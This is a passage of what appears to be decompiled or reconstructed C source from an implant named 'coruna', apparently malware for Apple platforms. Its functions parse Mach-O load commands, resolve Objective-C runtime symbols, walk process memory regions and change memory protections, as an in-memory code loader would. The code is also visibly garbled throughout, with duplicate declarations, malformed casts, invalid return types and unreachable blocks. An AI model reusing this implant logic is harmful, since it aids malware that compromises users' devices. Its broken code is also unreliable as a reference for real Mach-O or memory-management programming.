    }
    else if ((port != 0xe0600) && (port != 0xe0700)) {
      type_id_10 = 0x800 | 0xe0000;
      if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
    }
  }
invalid:
    ptr = "_objc_retainAutorelease";
    if (port < 0xf0000) {
      ptr = "__objc_flush_caches";
    }
    type_id_9 = coruna_implant65fc_residual_111(host_info[5],ptr,&serial_buf);
    if ((int)type_id_9 == 0) {
      type_id_10 = 0xfffff;
      if (port < 0xf0000) {
        type_id_10 = 0xdffff;
      }
      type_id_11 = 6;
      if (port < 0xf0000) {
        type_id_11 = 1;
      }
      version = 5;
      if (port <= type_id_10) {
        version = type_id_11;
      }
      type_id_9 = coruna_dladdr(serial_buf,version,tag,addr,&bootargs);
      if ((int)type_id_9 == 0) {
        serial_buf = (unsigned long *)0x0;
        if ((int)port < 0xf0000) {
          if ((int)port < 0xe0000) {
            if ((int)port < 0xd0400) {
              if ((int)port < 0xd0200) {
                if (port != 0xd0000) {
                  type_id_10 = 0x100 | 0xd0000;
                  coruna_ctx_free_11dc8(host_info[5]);
                  type_id_9 = type_id_14;
                  _dlclose(handle);
                  return type_id_9;
                }
              }
              else if (port != 0xd0200) {
                type_id_10 = 0x300 | 0xd0000;
                coruna_ctx_free_11dc8(host_info[5]);
                type_id_9 = type_id_14;
                _dlclose(handle);
                return type_id_9;
              }
            }
            else if ((int)port < 0xd0600) {
              if (port != 0xd0400) {
                type_id_10 = 0x500 | 0xd0000;
                coruna_ctx_free_11dc8(host_info[5]);
                type_id_9 = type_id_14;
                _dlclose(handle);
                return type_id_9;
              }
            }
            else if (port != 0xd0600) {
              type_id_10 = 0x700 | 0xd0000;
              coruna_ctx_free_11dc8(host_info[5]);
              type_id_9 = type_id_14;
              _dlclose(handle);
              return type_id_9;
            }
          }
          else if ((int)port < 0xe0400) {
            if ((int)port < 0xe0200) {
              if (port != 0xe0000) {
                type_id_10 = 0x100 | 0xe0000;
                coruna_ctx_free_11dc8(host_info[5]);
                type_id_9 = type_id_14;
                _dlclose(handle);
                return type_id_9;
              }
            }
            else if (port != 0xe0200) {
              type_id_10 = 0x300 | 0xe0000;
              coruna_ctx_free_11dc8(host_info[5]);
              type_id_9 = type_id_14;
              _dlclose(handle);
              return type_id_9;
            }
          }
          else if ((int)port < 0xe0600) {
            if (port != 0xe0400) {
              type_id_10 = 0x500 | 0xe0000;
              coruna_ctx_free_11dc8(host_info[5]);
              type_id_9 = type_id_14;
              _dlclose(handle);
              return type_id_9;
            }
          }
          else if ((port != 0xe0600) && (port != 0xe0700)) {
            type_id_10 = 0x800 | 0xe0000;
            coruna_ctx_free_11dc8(host_info[5]);
            type_id_9 = type_id_14;
            _dlclose(handle);
            return type_id_9;
          }
          return coruna_implant_libobjc_bind_after_flush(handle, port, kind, tag, addr, scratch,
              host_info[5]);
        }
        else {
          if ((int)port < 0xf0800) {
            if ((int)port < 0xf0400) {
              if ((int)port < 0xf0200) {
                if (port != 0xf0000) {
                  type_id_10 = 0x100 | 0xf0000;
                  coruna_ctx_free_11dc8(host_info[5]);
                  type_id_9 = type_id_14;
                  _dlclose(handle);
                  return type_id_9;
                }
              }
              else if (port != 0xf0200) {
                type_id_10 = 0x300 | 0xf0000;
                coruna_ctx_free_11dc8(host_info[5]);
                type_id_9 = type_id_14;
                _dlclose(handle);
                return type_id_9;
              }
            }
            else if ((int)port < 0xf0600) {
              if (port != 0xf0400) {
                type_id_10 = 0x500 | 0xf0000;
                coruna_ctx_free_11dc8(host_info[5]);
                type_id_9 = type_id_14;
                _dlclose(handle);
                return type_id_9;
              }
            }
            else if (port != 0xf0600) {
              type_id_10 = 0x700 | 0xf0000;
              coruna_ctx_free_11dc8(host_info[5]);
              type_id_9 = type_id_14;
              _dlclose(handle);
              return type_id_9;
            }
            return coruna_implant_libobjc_bind_after_flush(handle, port, kind, tag, addr, scratch,
                host_info[5]);
          }
          if (0x1002ff < (int)port) {
            if ((int)port < 0x100500) {
              if (port != 0x100300) {
                type_id_10 = 0x400 | 0x100000;
                coruna_ctx_free_11dc8(host_info[5]);
                type_id_9 = type_id_14;
                _dlclose(handle);
                return type_id_9;
              }
            }
            else if ((port != 0x100500) && (port != 0x100700)) {
              type_id_10 = 0x600 | 0x100000;
              coruna_ctx_free_11dc8(host_info[5]);
              type_id_9 = type_id_14;
              _dlclose(handle);
              return type_id_9;
            }
            return coruna_implant_libobjc_bind_after_flush(handle, port, kind, tag, addr, scratch,
                host_info[5]);
          }
          if (0x1000ff < (int)port) {
            if (port != 0x100100) {
              type_id_10 = 0x200 | 0x100000;
              coruna_ctx_free_11dc8(host_info[5]);
              type_id_9 = type_id_14;
              _dlclose(handle);
              return type_id_9;
            }
            return coruna_implant_libobjc_bind_after_flush(handle, port, kind, tag, addr, scratch,
                host_info[5]);
          }
          if ((port == 0xf0800) || (port == 0x100000)) {
            return coruna_implant_libobjc_bind_after_flush(handle, port, kind, tag, addr, scratch,
                host_info[5]);
          }
        }
load_ok:
        coruna_ctx_free_11dc8(host_info[5]);
        type_id_9 = type_id_14;
        _dlclose(handle);
        return type_id_9;
      }
    }
  else {
    if (coruna_implant_libobjc_port_rebind(port)) goto invalid;
    type_id_9 = 0x18008;
  }
  coruna_ctx_free_11dc8(host_info[5]);
check_ok:
  _dlclose(handle);
  return type_id_9;
}
uint64_t coruna_pthread_mutex_destroy(long handle)
{
  if (handle != 0) {
    if (*(int *)(handle + 0x50) == 2) {
      _pthread_mutex_destroy((pthread_mutex_t *)(handle + 0x58));
      *(uint64_t *)(handle + 0x60) = 0;
      *(uint64_t *)(handle + 0x58) = 0;
      *(uint64_t *)(handle + 0x70) = 0;
      *(uint64_t *)(handle + 0x68) = 0;
      *(uint64_t *)(handle + 0x80) = 0;
      *(uint64_t *)(handle + 0x78) = 0;
      *(uint64_t *)(handle + 0x90) = 0;
      *(uint64_t *)(handle + 0x88) = 0;
      *(uint64_t *)(handle + 0xa0) = 0;
      *(uint64_t *)(handle + 0x98) = 0;
      *(uint64_t *)(handle + 0xa8) = 0;
    }
    *(uint64_t *)(handle + 0xa8) = 0;
    *(uint64_t *)(handle + 0x90) = 0;
    *(uint64_t *)(handle + 0x88) = 0;
    *(uint64_t *)(handle + 0xa0) = 0;
    *(uint64_t *)(handle + 0x98) = 0;
    *(uint64_t *)(handle + 0x70) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
    *(uint64_t *)(handle + 0x80) = 0;
    *(uint64_t *)(handle + 0x78) = 0;
    *(uint64_t *)(handle + 0x50) = 0;
    *(uint64_t *)(handle + 0x48) = 0;
    *(uint64_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x58) = 0;
    *(uint64_t *)(handle + 0x30) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    *(uint64_t *)(handle + 0x40) = 0;
    *(uint64_t *)(handle + 0x38) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_objc_metaclass_prefix(long *handle)
{
  int err;
  int status;
  uint64_t u;
  long handle;
  char *ptr;
  long addr;
  unsigned long size;
  long off;
  
  if (handle == (long *)0x0) {
    u = 0xad001;
  }
  else {
    addr = 0;
    handle = *handle;
    size = 0xffffffffffffffff;
    do {
      size = size + 1;
      if (*(uint *)(handle + 0x16) <= size) {
        return 0;
      }
      off = handle[0x15];
      ptr = *(char **)(off + addr);
      err = _strncmp(ptr,"_OBJC_CLASS_$_",0xe);
      if ((err == 0) || (status = _strncmp(ptr,"_OBJC_METACLASS_$_",0x12), status == 0)) {
        u = coruna_dlsym(handle,handle + 0x28,*(uint64_t *)(off + addr + 8),err != 0);
      }
      else {
        u = 0;
      }
      addr = addr + 0x10;
    } while ((int)u == 0);
  }
  return u;
}





int coruna_dlsym(long handle,long *addr_2,uint64_t *val,unsigned long arg)
{
  uint64_t *ptr;
  unsigned long *buf;
  uint64_t *str;
  uint64_t *copy;
  unsigned long u;
  uint64_t size;
  int err;
  uint64_t version;
  long handle;
  unsigned long port;
  
  err = 0xad001;
  if (((handle != 0) && (addr_2 != (long *)0x0)) &&
     (*addr_2 != 0 && val != (uint64_t *)0x0)) {
    handle = 0;
    port = 0;
    ptr = val + 5;
    err = 0xad011;
    while (err == 0xad011) {
      if (*(uint *)(handle + 0x88) <= port) {
        return 0xad011;
      }
      buf = (unsigned long *)(*(long *)(handle + 0x80) + handle);
      copy = (uint64_t *)*buf;
      u = buf[1];
      str = (uint64_t *)((long)copy + u);
      port = port + 1;
      err = 0;
      if (((((ptr > str || copy > ptr) || str <= val) || copy > val) ||
          u == 0xffffffffffffffff) ||
          (((ptr <= str && copy <= ptr) && val < str) && copy <= val) &&
          (long)u < -1) {
        err = 0xad011;
      }
      handle = handle + 0x18;
    }
    if (err == 0) {
      size = _dlsym(*addr_2,"OBJC_METACLASS_$_NSObject");
      *val = size;
      if ((arg & 1) == 0) {
        size = _dlsym(*addr_2,"OBJC_CLASS_$_NSObject");
      }
      val[1] = size;
      size = _dlsym(*addr_2,"_objc_empty_cache");
      val[2] = size;
      size = _dlsym(*addr_2,"_objc_empty_vtable");
      err = 0;
      version = *(uint64_t *)(handle + 8);
      val[3] = size;
      val[4] = version;
    }
  }
  return err;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd(long handle,long addr_2)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  u = 0xad001;
  if (((((handle != 0) && (*(long *)(handle + 0x38) != 0)) && (*(long *)(handle + 0x40) != 0)) &&
      ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) &&
     ((*(char *)(addr_2 + 0xfc) != '\0' &&
      ((u = 0, (*(ushort *)(addr_2 + 0x1c0) >> 8 & 1) != 0 &&
       (*(uint *)(handle + 0x30) >> 0x11 < 7)))))) {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_1e8b0;
    thread_attr = coruna_macho_objc_sect;
    host_info = &k_implant_rodata_word_200c8;
    serial_buf = addr_2;
    u = coruna_macho_foreach_loadcmd(addr_2,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_macho_text_seg_f2d8(char *path,char *str_2,long handle,long *addr_2,uint64_t *val)
{
  uint64_t u;
  int err;
  int status;
  uint64_t size;
  int *err;
  int *status;
  int flags;
  int *flags;
  unsigned long version;
  int *count;
  int *idx;
  
  size = 0x18006;
  err = *(int *)(handle + 0x10);
  if (err != 0) {
    err = (int *)0x0;
    flags = 0;
    flags = (int *)(handle + 0x20);
    count = (int *)0x0;
    do {
      idx = count;
      if ((count != (int *)0x0) && (err != (int *)0x0)) break;
      if (*flags == 0x19) {
        status = _strcmp((char *)(flags + 2),"__TEXT");
        idx = flags;
        if (status != 0) {
          idx = count;
        }
        if (err == (int *)0x0) {
          status = _strcmp((char *)(flags + 2),path);
          if ((status == 0) && (version = (unsigned long)(uint)flags[0x10], flags[0x10] != 0)) {
            count = flags + 0x12;
            status = (int *)0x0;
            do {
              status = _strcmp((char *)count,str_2);
              err = count;
              if (status != 0) {
                err = status;
              }
              count = count + 0x14;
              version = version - 1;
              status = err;
            } while (version != 0);
          }
          else {
            err = (int *)0x0;
          }
        }
      }
      flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
      flags = flags + 1;
      count = idx;
    } while (flags != err);
    size = 0x18006;
    if ((idx != (int *)0x0) && (err != (int *)0x0)) {
      size = 0;
      u = *(uint64_t *)(err + 10);
      *addr_2 = (handle - *(long *)(idx + 6)) + *(long *)(err + 8);
      *val = u;
    }
  }
  return size;
}





uint64_t coruna_dladdr(unsigned long arg,int flags,long handle,long addr_2,unsigned long *arg)
{
  int err;
  unsigned long u;
  uint64_t size;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long bootargs;
  
  size = 0xad001;
  if (((arg != 0) && (handle != 0)) && (arg != (unsigned long *)0x0)) {
    size = 0x18005;
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    u = arg;
    while (arg < (unsigned long)(handle + addr_2)) {
      err = _dladdr(arg,&scratch);
      version = arg;
      if ((err != 0) && (u != bootargs)) {
        flags = flags + -1;
        if (flags == 0) {
          *arg = bootargs;
          return 0;
        }
        u = bootargs;
        version = bootargs;
        if (bootargs <= arg) {
          version = arg;
        }
      }
      arg = version + 1;
    }
  }
  return size;
}
uint coruna_macho_objc_sect(long handle,long addr_2)
{
  uint u;
  bool err;
  int err;
  unsigned long size;
  unsigned long version;
  
  err = _strcmp((char *)(addr_2 + 8),"__TEXT");
  if ((err == 0) &&
     (size = addr_2 + 0x48U + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50, addr_2 + 0x48U < size)) {
    version = addr_2 + 0x98;
    do {
      err = _strcmp((char *)(version - 0x50),"__objc_methlist");
      if ((err == 0) &&
         (u = *(int *)(*(long *)(*(long *)(handle + 0x20) + 0x18) + *(long *)(version - 0x30)) >>
                  0x1f & 0x18014, u != 0)) {
        return u;
      }
      err = version < size;
      version = version + 0x50;
    } while (err);
  }
  return 0;
}





uint coruna_mach_vm_region_recurse(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint *size,
                 uint8_t *buf,long addr_2)
{
  uint u;
  bool err;
  uint size;
  kern_return_t lk4;
  uint8_t version;
  natural_t scratch;
  mach_msg_type_number_t bootargs;
  unsigned long thread_attr [5];
  short host_info;
  uint64_t scratch;
  mach_vm_size_t serial_buf;
  mach_vm_address_t action;
  
  serial_buf = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  scratch = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  bootargs = 0xc;
  size = 0xad001;
  if (((size != (uint *)0x0) && (buf != (uint8_t *)0x0)) && (addr_2 != 0)) {
    scratch = 1;
    action = arg_x;
    size = _mach_vm_region_recurse
                      (arg,&action,&serial_buf,&scratch,(vm_region_recurse_info_t)thread_attr,
                       &bootargs);
    if (size == 0) {
      u = (uint)thread_attr[0];
      err = host_info != 0;
      size = (uint)thread_attr[0] >> 2 & 1;
      version = (uint8_t)size;
      if ((serial_buf + action < handle + arg_x) && (((uint)thread_attr[0] >> 2 & 1) == 0)) {
        do {
          version = (uint8_t)size;
          scratch = 1;
          bootargs = 0xc;
          lk4 = _mach_vm_region_recurse
                            (arg,&action,&serial_buf,&scratch,
                             (vm_region_recurse_info_t)thread_attr,&bootargs);
          if (lk4 != 0) break;
          size = (uint)thread_attr[0] >> 2 & 1;
          version = (uint8_t)size;
          action = action + serial_buf;
        } while (action + serial_buf < handle + arg_x && (thread_attr[0] & 4) == 0);
      }
      size = 0;
      *size = u;
      *buf = version;
      *(bool *)addr_2 = err;
    }
    else {
      size = size | 0x80000000;
    }
  }
  return size;
}





unsigned long coruna_mach_vm_protect(long arg,long val,unsigned long n,mach_vm_address_t m,
                  mach_vm_size_t p,uint q)

{
  uint32_t u;
  uint size;
  unsigned long type_id_8;
  void (*copy)(void);
  vm_map_t target_task;
  unsigned long cache_45;
  mach_vm_address_t scratch;
  mach_vm_size_t bootargs;
  uint thread_attr;
  uint32_t cache_36;
  uint32_t stack_guard;
  uint64_t cache_46;
  uint16_t cache_47;
  uint cache_40;
  
  if (arg == 0) {
    return 0xad001;
  }
  if (*(long *)(arg + 0x28) == 0 || val == 0) {
    return 0xad001;
  }
  cache_40 = 0;
  cache_47 = 0;
  type_id_8 = coruna_mach_vm_region_recurse(n,m,p,&cache_40,(long)&cache_47 + 1,&cache_47);
  if ((int)type_id_8 != 0) {
    return type_id_8;
  }
  target_task = (vm_map_t)n;
  if ((q >> 2 & 1) == 0) {
    if (cache_47 != '\0') {
      copy = *(void (**)(arg + 0x28);
      if (copy == (void (*)0x0) {
        type_id_8 = 0xad001;
        (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
        return type_id_8;
      }
      thread_attr = 0;
      u = 0x40000012;
      cache_36 = 1;
      cache_45 = n & 0xffffffff;
      scratch = m;
      bootargs = p;
      type_id_8 = (*copy)(arg,val,u,&cache_45);
      (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
      return type_id_8;
    }
    size = _mach_vm_protect(target_task,m,p,0,q);
    type_id_8 = (unsigned long)(size | 0x80000000);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id_8;
load_ok_38:
    type_id_8 = 0;
  }
  else {
    thread_attr = cache_40;
    copy = *(void (**)(arg + 0x28);
    u = 0x40000021;
load_ok_36:
    cache_36 = 1;
    cache_45 = n & 0xffffffff;
    scratch = m;
    bootargs = p;
    type_id_8 = (*copy)(arg,val,u,&cache_45);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id_8;
    size = _mach_vm_protect(target_task,m,p,0,q);
    if (size != 0) {
load_ok_37:
      type_id_8 = (unsigned long)(size | 0x80000000);
      (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
      return type_id_8;
    }
    type_id_8 = 0;
    }
    else {
    thread_attr = cache_40;
    copy = *(void (**)(arg + 0x28);
    u = 0x40000021;
    cache_36 = 1;
    cache_45 = n & 0xffffffff;
    scratch = m;
    bootargs = p;
    type_id_8 = (*copy)(arg,val,u,&cache_45);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id_8;
    type_id_8 = 0xad001;
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return type_id_8;
    cache_45 = n & 0xffffffff;
    cache_36 = 1;
    scratch = m;
    bootargs = p;
    thread_attr = q;
    type_id_8 = (**(void (**)(arg + 0x28))(arg,val,0x4000000e,&cache_45);
  }
  if (k_implant_rodata_word_1e8b8 <= *(double *)k_implant_dyldversionnumber_slot && (int)type_id_8 == 0) {
    cache_45 = coruna_u64_pack((cache_45), (target_task));
    thread_attr = thread_attr & 0xffffff00;
    cache_46 = 0;
    cache_36 = 0;
    stack_guard = 0;
    scratch = m;
    bootargs = p;
    type_id_8 = (**(void (**)(arg + 0x28))(arg,val,0xc0000023,&cache_45);
    if ((int)type_id_8 == 0) {
      if ((char)thread_attr == '\0') {
        type_id_8 = 0;
      }
      else {
        thread_attr = thread_attr & 0xffffff00;
        type_id_8 = (**(void (**)(arg + 0x28))(arg,val,0x40000023,&cache_45);
      }
    }
  }
load_ok_35:
  (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
  return type_id_8;
}





uint64_t
void coruna_implant65fc_via_mach_vm_region_recurse(long handle,long addr_2,unsigned long arg,uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint64_t size;
  uint16_t scratch;
  uint bootargs;
  unsigned long thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long host_info;
  
  size = 0xad001;
  u = size;
  if ((handle != 0) && (*(void (**)(handle + 0x28) != (void (*)0x0 && addr_2 != 0)) {
    bootargs = 0;
    scratch = 0;
    u = (**(void (**)(handle + 0x28))(handle,addr_2,0xc,arg & 0xffffffff);
    if (((int)u == 0) &&
       (u = coruna_mach_vm_region_recurse(arg,val,id_2,&bootargs,(long)&scratch + 1,&scratch),
       (int)u == 0)) {
      if (scratch == '\0') {
        u = 0;
      }
      else {
        if ((char)scratch == '\0') {
          size = 0x12013;
        }
        else if (*(void (**)(handle + 0x28) != (void (*)0x0) {
          thread_attr = arg & 0xffffffff;
          host_info = (unsigned long)bootargs;
          scratch = val;
          bootargs = id_2;
          size = (**(void (**)(handle + 0x28))(handle,addr_2,0x4000000e,&thread_attr);
        }
        (**(void (**)(handle + 0x28))(handle,addr_2,0xc,arg & 0xffffffff);
        u = size;
      }
    }
  }
  return u;
}





int coruna_implant65fc_residual_109(long *handle)
{
  ushort u;
  ushort size;
  ushort version;
  uint port;
  int *err;
  
  if (((handle != (long *)0x0) && (err = (int *)handle[0x29], err != (int *)0x0)) &&
     (*handle != 0)) {
    if ((unsigned long)handle[0x2a] < 0x20) {
      return 0x13001;
    }
    if (*err == -0x1120531) {
      if ((unsigned long)handle[0x2a] < (unsigned long)(uint)err[5] + 0x20) {
        port = 0x6002;
      }
      else if (err[1] == 0x100000c) {
        port = err[2] & 0xffffff;
        if (((port < 2) && ((int)port <= *(int *)(*handle + 0x18))) ||
           (*(char *)((long)handle + 0x1c2) != '\0')) {
          if ((((uint)err[6] >> 0x17 & 1) == 0) || (*(char *)((long)handle + 0x1c2) != '\0')) {
            u = *(ushort *)(handle + 0x38);
            version = u & 0x1f | (ushort)(((uint)err[6] >> 5 & 1) << 5);
            size = u & 0xffc0 | version;
            *(ushort *)(handle + 0x38) = size;
            if (1 < port) {
              *(ushort *)(handle + 0x38) = size | 0x80;
              *(uint8_t *)(handle + 0x22) = 1;
              *(ushort *)(handle + 0x38) =
                   (ushort)((uint)err[2] >> 0x17) & 0x100 | u & 0xfec0 | version | 0x80;
            }
            handle[0x2e] = (long)err;
            handle[0x21] = (unsigned long)(uint)err[5] + 0x20;
            return 0;
          }
          port = 0x6006;
        }
        else {
          port = 0x6004;
        }
      }
      else {
        port = 0x6003;
      }
    }
    else {
      port = 0x6001;
    }
    return (port | 0xfff60000) + 0xad001;
  }
  return 0xad001;
}





uint64_t coruna_macho_foreach_loadcmd(long handle,int flags,long addr_2)
{
  int *err;
  uint u;
  uint64_t size;
  int *status;
  int *flags;
  long handle;
  int *count;
  uint version;
  
  size = 0xad001;
  if ((((handle != 0) && (*(long *)(handle + 0x170) != 0)) &&
      (flags = *(int **)(handle + 0x148), flags != (int *)0x0)) &&
     ((handle = *(long *)(handle + 0x150), handle != 0 && (addr_2 != 0)))) {
    u = *(uint *)(*(long *)(handle + 0x170) + 0x10);
    if (u == 0) {
      size = 0;
    }
    else {
      if (((-1 < handle) && (status = flags + 8, flags <= status)) &&
         ((count = (int *)((long)flags + handle), status < count &&
          ((flags <= flags + 10 && (flags + 10 <= count)))))) {
        version = 1;
        while (err = (int *)((long)status + (unsigned long)(uint)status[1]),
              flags <= err && err <= count) {
          if ((flags == 0) || (*status == flags)) {
            size = (**(void (**)(addr_2 + 0x10))(addr_2);
            if ((int)size != 0) {
              return size;
            }
          }
          else {
            size = 0;
          }
          if (u <= version) {
            return size;
          }
          if ((((*(long *)(handle + 0x150) < 0) ||
               (flags = *(int **)(handle + 0x148), err < flags)) ||
              (count = (int *)((long)flags + *(long *)(handle + 0x150)), count <= err)) ||
             ((err + 2 < flags || (version = version + 1, status = err, count < err + 2))))
          break;
        }
      }
      size = 0x14009;
    }
  }
  return size;
}





int coruna_block_dispose_fcd0(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int status;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t scratch;
  long action;
  uint64_t block_ctx;
  uint64_t *stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  
  status = 0xad001;
  if ((handle != 0) && (id_2 != (uint64_t *)0x0)) {
    serial_buf = &block_ctx;
    block_ctx = 0;
    sa_saved = k_implant_rodata_word_1e8c0;
    sa_new = 0;
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_1e8c8;
    thread_attr = coruna_macho_pagezero;
    host_info = &k_implant_rodata_word_200e8;
    scratch = val;
    action = handle;
    stack_guard = serial_buf;
    err = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    if (err == 0xad017) {
      *id_2 = stack_guard[3];
      status = 0;
    }
    else {
      status = 0xad011;
      if (err != 0) {
        status = err;
      }
    }
    __Block_object_dispose(&block_ctx,8);
  }
  return status;
}





uint32_t coruna_macho_pagezero(long handle,long addr_2)
{
  unsigned long u;
  int err;
  unsigned long size;
  
  size = *(unsigned long *)(addr_2 + 0x30);
  if (size != 0) {
    err = _strncmp((char *)(addr_2 + 8),"__PAGEZERO",0xb);
    if (err == 0) {
      return 0;
    }
    u = *(unsigned long *)(handle + 0x28) - *(unsigned long *)(addr_2 + 0x28);
    if ((*(unsigned long *)(addr_2 + 0x28) <= *(unsigned long *)(handle + 0x28)) && (u < size)) {
      *(unsigned long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) =
           *(long *)(addr_2 + 0x18) + u + *(long *)(*(long *)(handle + 0x30) + 0x18);
      return 0xad017;
    }
  }
  return 0;
}





void coruna_block_assign_fe28(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  return;
}





void coruna_block_dispose_fe38(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t
void coruna_implant65fc_via_implant65fc_via_mach_vm_region_recurse(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
            uint8_t *buf)
{
  uint64_t u;
  uint8_t size;
  
  if (handle == (long *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)handle + 0x1d) == '\0') {
    u = 0;
  }
  else {
    if ((*handle == 0) || (handle[1] == 0)) {
      size = 0;
      u = 0;
      if (buf != (uint8_t *)0x0) {
      u = 0;
      *buf = size;
      }
      return u;
    }
    u = coruna_implant65fc_via_mach_vm_region_recurse(*handle,handle[1],val,id_2,size_3);
  }
  size = 1;
  if ((int)u != 0) {
    return u;
  }
fail:
  if (buf != (uint8_t *)0x0) {
    u = 0;
    *buf = size;
  }
  return u;
}





unsigned long coruna_mach_vm_protect_fec8(long *arg,uint64_t val,mach_vm_address_t n,mach_vm_size_t m
                  ,uint64_t p,uint8_t *q)

{
  char status;
  bool i;
  uint type_id_8;
  uint version;
  int count;
  unsigned long tag;
  int *err;
  uint *str;
  vm_map_t target_task;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  if (*arg == 0) {
    status = *(char *)((long)arg + 0x1d);
    i = status == '\0';
  }
  else {
    status = *(char *)((long)arg + 0x1d);
    i = status == '\0';
    if (!i && arg[1] != 0) {
      tag = coruna_mach_vm_protect(*arg,arg[1],val,n,m,p);
      i = true;
      type_id_8 = (uint)tag;
      if ((type_id_8 == 0) && (q != (uint8_t *)0x0)) {
      tag = 0;
      *q = i;
      }
      return tag;
    }
  }
  target_task = (vm_map_t)val;
  if ((i) || (((uint)p >> 2 & 1) == 0)) {
    i = status != '\x01';
  }
  else {
    if ((target_task != 0) && (*(vm_map_t *)k_implant_mach_task_self_slot != target_task)) {
      return 0x14010;
    }
    count = _mlock(n,m);
    if (count != 0) {
      err = ___error();
      count = *err;
      str = (uint *)___error();
      type_id_8 = -*str;
      if (-1 < count) {
        type_id_8 = *str;
      }
      return (unsigned long)(type_id_8 | 0x40000000);
    }
    _madvise(n,m,6);
    i = false;
  }
  version = _mach_vm_protect(target_task,n,m,0,(uint)p);
  type_id_8 = 0;
  if (version != 0) {
    type_id_8 = version | 0x80000000;
  }
  tag = (unsigned long)type_id_8;
joined_r0x0000ffa8:
  if ((type_id_8 == 0) && (q != (uint8_t *)0x0)) {
    tag = 0;
    *q = i;
  }
  return tag;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_2(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle != 0) {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_1e8b0;
    thread_attr = coruna_macho_pagezero_10078;
    host_info = &k_implant_rodata_word_20118;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    return u;
  }
  return 0xad001;
}





unsigned long coruna_macho_pagezero_10078(long arg,long val)

{
  mach_vm_address_t address;
  int err;
  uint size;
  unsigned long type_id_8;
  uint64_t *data;
  vm_machine_attribute_val_t cache_48;
  
  size = _strncmp((char *)(val + 8),"__PAGEZERO",0xb);
  type_id_8 = (unsigned long)size;
  if (size != 0) {
    data = *(uint64_t **)(arg + 0x20);
    address = data[10] + *(long *)(val + 0x18);
    err = *(int *)(val + 0x3c);
    if (err == 0) {
      err = 1;
    }
    type_id_8 = coruna_mach_vm_protect_fec8(*data,*(uint32_t *)(data + 0xb),address,
                         *(uint64_t *)(val + 0x20),err,0);
    if ((int)type_id_8 == 0) {
      cache_48 = 6;
      _mach_vm_machine_attribute
                (*(vm_map_t *)(*(long *)(arg + 0x20) + 0x58),address,
                 *(mach_vm_size_t *)(val + 0x20),1,&cache_48);
      type_id_8 = 0;
    }
  }
  return type_id_8;
}





uint64_t coruna_implant65fc_residual_110(long handle,long addr_2,uint64_t val)
{
  uint64_t *ptr;
  void *ptr;
  uint64_t u;
  
  u = 0x1200a;
  if (((handle != 0) && (addr_2 != 0)) &&
     (ptr = _realloc(*(void **)(handle + 0x98),(unsigned long)(*(int *)(handle + 0xa0) * 0x10 + 0x20)),
     ptr != (void *)0x0)) {
    u = 0;
    *(void **)(handle + 0x98) = ptr;
    ptr = (uint64_t *)((long)ptr + (unsigned long)*(uint *)(handle + 0xa0) * 0x10);
    *(uint *)(handle + 0xa0) = *(uint *)(handle + 0xa0) + 1;
    *ptr = val;
    ptr[1] = addr_2;
  }
  return u;
}





uint64_t coruna_implant65fc_via_macho_foreach_loadcmd_3(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_vm_deallocate();
    scratch = k_implant_nsconcretestackblock_slot;
    if ((int)u == 0) {
      *(uint8_t *)(handle + 0x78) = 1;
      bootargs = k_implant_rodata_word_1e8b0;
      thread_attr = coruna_macho_unwind_info;
      host_info = &k_implant_rodata_word_20138;
      serial_buf = handle;
      u = coruna_macho_foreach_loadcmd(handle,0,&scratch);
    }
  }
  return u;
